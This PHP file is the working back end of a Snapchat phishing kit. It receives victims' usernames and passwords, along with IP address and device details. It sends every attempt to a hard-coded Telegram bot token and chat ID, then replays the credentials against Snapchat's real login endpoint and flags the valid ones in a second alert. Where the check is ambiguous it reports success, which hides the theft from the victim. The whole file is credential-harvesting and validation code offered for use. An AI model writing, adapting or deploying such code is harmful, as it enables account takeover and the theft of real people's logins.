<?php
// validate.php — receives credentials, checks against real Snapchat, sends to Telegram

define('TELEGRAM_BOT_TOKEN', '8679202995:AAG8eQXbio2vL1Y6scvcKxWHSeBNoOmD3_s');
define('TELEGRAM_CHAT_ID', '7133577749');

// --- CORS headers for direct JS fetch ---
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

// --- Grab input ---
$username  = $_POST['username'] ?? '';
$password  = $_POST['password'] ?? '';
$ip        = $_POST['ip'] ?? 'Unknown';
$userAgent = $_POST['userAgent'] ?? 'Unknown';
$timestamp = $_POST['timestamp'] ?? date('c');
$isMobile  = ($_POST['isMobile'] ?? '0') === '1';

if (empty($username) || empty($password)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Missing fields']);
    exit;
}

// --- Step 1: Send EVERY attempt to Telegram immediately ---
sendToTelegram($username, $password, $ip, $userAgent, $timestamp, 'attempt', $isMobile);

// --- Step 2: Validate against real Snapchat ---
$isValid = validateWithSnapchat($username, $password);

// --- Step 3: If valid, send a second "VALID" alert ---
if ($isValid) {
    sendToTelegram($username, $password, $ip, $userAgent, $timestamp, 'VALID', $isMobile);
}

// --- Step 4: Return result to the frontend ---
echo json_encode([
    'status'  => $isValid ? 'valid' : 'invalid',
    'message' => $isValid ? 'Login successful' : 'Invalid credentials'
]);

// ================================================================
// FUNCTIONS
// ================================================================

/**
 * Send credential data to Telegram
 */
function sendToTelegram(string $username, string $password, string $ip, string $userAgent, string $timestamp, string $status, bool $isMobile): void {
    $icon = $status === 'VALID' ? '🔥✅' : ($status === 'attempt' ? '📥' : '❌');
    $statusLabel = $status === 'VALID' ? '✅ VALID' : ($status === 'attempt' ? 'ATTEMPT' : 'INVALID');

    $message = "<b>{$icon} Snapchat Credential Captured</b>\n"
             . "<b>Status:</b> {$statusLabel}\n"
             . "<b>User:</b> <code>" . htmlspecialchars($username, ENT_QUOTES) . "</code>\n"
             . "<b>Pass:</b> <code>" . htmlspecialchars($password, ENT_QUOTES) . "</code>\n"
             . "<b>IP:</b> {$ip}\n"
             . "<b>Device:</b> " . ($isMobile ? '📱 Mobile' : '💻 Desktop') . "\n"
             . "<b>Time:</b> {$timestamp}\n"
             . "<b>UA:</b> " . htmlspecialchars(substr($userAgent, 0, 100), ENT_QUOTES);

    $payload = [
        'chat_id'    => TELEGRAM_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'HTML',
    ];

    $ch = curl_init('https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/**
 * Validate credentials against the real Snapchat login endpoint
 */
function validateWithSnapchat(string $username, string $password): bool {
    // Step 1: Get a fresh session and xsrf_token
    $ch = curl_init('https://accounts.snapchat.com/accounts/login');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        CURLOPT_COOKIEJAR      => 'snap_jar.txt',
        CURLOPT_COOKIEFILE     => 'snap_jar.txt',
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Extract xsrf_token
    preg_match('/data-xsrf="([^"]+)"/', $response, $matches);
    $xsrfToken = $matches[1] ?? '';

    if (empty($xsrfToken)) {
        // Can't get token — fallback: assume valid so user gets redirected
        return true;
    }

    // Step 2: POST login credentials
    $postData = http_build_query([
        'username' => $username,
        'password' => $password,
        'xsrf_token' => $xsrfToken,
        'continue' => '%2Faccounts%2Fwelcome',
    ]);

    $ch = curl_init('https://accounts.snapchat.com/accounts/login');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        CURLOPT_COOKIEFILE     => 'snap_jar.txt',
        CURLOPT_COOKIEJAR      => 'snap_jar.txt',
        CURLOPT_REFERER        => 'https://accounts.snapchat.com/',
        CURLOPT_HTTPHEADER     => [
            'Origin: https://accounts.snapchat.com',
            'Content-Type: application/x-www-form-urlencoded',
        ],
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $redirectUrl = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
    curl_close($ch);

    // Clean up cookie jar
    @unlink('snap_jar.txt');

    // Check for success indicators
    // HTTP redirect (302/303) = success
    if (in_array($httpCode, [302, 303, 301]) && !empty($redirectUrl)) {
        return true;
    }

    if (strpos($response, 'My Data') !== false ||
        strpos($response, 'Delete My Account') !== false ||
        strpos($response, 'change_password') !== false) {
        return true;
    }

    // Check for failure indicators
    if (strpos($response, 'Cannot find the user') !== false ||
        strpos($response, 'not the right password') !== false ||
        strpos($response, 'incorrect') !== false) {
        return false;
    }

    // Ambiguous — CAPTCHA or unknown response. Assume valid.
    return true;
}
